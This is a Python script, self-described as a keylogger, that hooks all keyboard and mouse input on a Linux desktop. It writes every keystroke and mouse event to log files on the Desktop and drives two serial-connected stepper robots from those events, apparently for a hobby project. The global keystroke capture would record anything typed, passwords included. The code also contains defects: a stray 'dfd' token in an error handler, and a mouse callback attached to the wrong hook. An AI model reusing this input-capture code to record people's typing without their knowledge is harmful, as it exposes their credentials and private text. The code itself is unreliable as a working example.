# Python code for keylogger
# to be used in linux
import os
import time
import pyxhook
from gcode_send import GcodeController
import random
import math

import subprocess

# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
log_file = os.path.expanduser('~/Desktop/keyboard.log')

log_file2 = os.path.expanduser('~/Desktop/mouse.log')

# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
	os.environ.get(
		'pylogger_cancel',
		'`'
	)[0]
)

# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
	try:
		os.remove(log_file)
	except EnvironmentError:
	# File does not exist, or no permissions.
		pass


mouse_stepper_path = "/dev/serial/by-id/usb-1a86_USB2.0-Serial-if00-port0"
mouse_stepper_path = os.path.realpath(mouse_stepper_path)

keyboard_stepper_path = "/dev/serial/by-id/usb-FTDI_FT232R_USB_UART_A602AAJR-if00-port0"
keyboard_stepper_path = os.path.realpath(keyboard_stepper_path)

key_gcode = None

try:
	key_gcode = GcodeController(keyboard_stepper_path)
except Exception as e:
	print(e)
	print("can't connect to keyboard robot, passing")

mouse_gcode = None
try:
	mouse_gcode = GcodeController(mouse_stepper_path)
except Exception as e:
	print(e)
	print("can't connect to mouse robot, passing")
	

### callback for key press

class KeyClass:
	def __init__(self):
		self.LAST_KEY_PRESS = 0
		self.MAX_KEY_TIME = 0.1
		return
	def OnKeyPress(self, event):
		current = time.time()
		if current - self.LAST_KEY_PRESS > self.MAX_KEY_TIME:
			if key_gcode is not None:
				print("mouse move")
				key_gcode.goto_location(50, 50, 700)
				
				self.LAST_KEY_PRESS = current
		
		# Debug
		
		with open(log_file, 'a') as f:
			f.write('{}\n'.format(event.Key))


### Callback for mouse move
class MouseClass:
	def __init__(self, x_resolution=1280, y_resolution=1024):
		self.LAST_MOUSE_MOVE = 0
		self.MAX_MOUSE_TIME = 3
		self.last_x = None
		self.last_y = None
		self.x_resolution = x_resolution
		self.y_resolution = y_resolution
		return
		
	def MouseMove(self, event):
		x, y = event.Position
		if self.last_x is None or self.last_y is None:
			self.last_x = x
			self.last_y = y
		
		MAX_MOVE = 2
		STEP_MAX = 30
		distance = math.sqrt((x - self.last_x)**2 + (y - self.last_y)**2)
		print(distance)
		if  distance > MAX_MOVE:
			current = time.time()
			if current - self.LAST_MOUSE_MOVE > self.MAX_MOUSE_TIME:
				if mouse_gcode is not None:
					# random.randint(0, 30)
					mouse_gcode.goto_location(
					x / self.x_resolution * STEP_MAX,
					y / self.y_resolution * STEP_MAX,
					2500)
					
					self.LAST_MOUSE_MOVE = current
			
			# Debug
			with open(log_file2, 'a') as f:
				f.write('{}\n'.format(event))
		self.last_x = x
		self.last_y = y
		
		
if __name__ == "__main__":
	# create a hook manager object
	new_hook = pyxhook.HookManager()
	# new_hook.KeyDown = OnKeyPress
	keys_class = KeyClass()
	new_hook.KeyDown = keys_class.OnKeyPress
	# set the hook
	new_hook.HookKeyboard()
	try:
		new_hook.start()		 # start the hook
	except KeyboardInterrupt:
		# User cancelled from command line.
		pass
	except Exception as ex:
		# Write exceptions to the log file, for analysis later.
		msg = 'Error while catching events:\n {}'.format(ex)
		pyxhook.print_err(msg)
		with open(log_file, 'a') as f:
			f.write('\n{}'.format(msg))
			dfd
	# create a hook manager object
	mouse_class = MouseClass()
	new_hook2 = pyxhook.HookManager()
	new_hook.MouseMovement = mouse_class.MouseMove
	# set the hook
	new_hook2.HookMouse()
	try:
		new_hook2.start()		 # start the hook
	except KeyboardInterrupt:
		# User cancelled from command line.
		pass
	except Exception as ex:
		# Write exceptions to the log file, for analysis later.
		msg = 'Error while catching events:\n {}'.format(ex)
		pyxhook.print_err(msg)
		with open(log_file, 'a') as f:
			f.write('\n{}'.format(msg))
		
